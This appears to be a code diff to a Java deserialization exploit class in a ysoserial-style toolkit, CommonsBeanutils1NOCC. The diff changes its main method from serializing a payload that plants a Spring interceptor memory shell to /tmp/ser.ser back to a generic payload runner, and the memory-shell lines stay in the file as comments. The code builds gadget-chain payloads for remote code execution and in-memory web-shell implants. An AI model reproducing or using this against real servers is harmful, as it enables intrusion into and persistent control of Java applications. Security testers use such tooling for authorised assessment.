@@ -8,6 +8,7 @@ import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.templates.SpringInterceptorTemplate;
 import ysoserial.payloads.util.ClassFiles;
 import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 import java.io.File;
@@ -20,14 +21,14 @@ import java.util.PriorityQueue;
 public class CommonsBeanutils1NOCC implements ObjectPayload<Object> {
 
     public static void main(final String[] args) throws Exception {
-//        PayloadRunner.run(CommonsBeanutils1NOCC.class, args);
-        String encode = BASE64Encoder.class.newInstance().encode(ClassFiles.classAsBytes(SpringInterceptorTemplate.class)).replaceAll("\n", "");
-        System.out.println(encode.replaceAll("\n", ""));
-
-        Object object = new CommonsBeanutils1NOCC().getObject("CLASS:SpringInterceptorMemShell");
-        File file = new File("/tmp/ser.ser");
-        if (file.exists()) file.delete();
-        Serializer.serialize(object, new FileOutputStream(file));
+        PayloadRunner.run(CommonsBeanutils1NOCC.class, args);
+//        String encode = BASE64Encoder.class.newInstance().encode(ClassFiles.classAsBytes(SpringInterceptorTemplate.class)).replaceAll("\n", "");
+//        System.out.println(encode.replaceAll("\n", ""));
+//
+//        Object object = new CommonsBeanutils1NOCC().getObject("CLASS:SpringInterceptorMemShell");
+//        File file = new File("/tmp/ser.ser");
+//        if (file.exists()) file.delete();
+//        Serializer.serialize(object, new FileOutputStream(file));
     }
 
     public Object getObject(final String command) throws Exception {
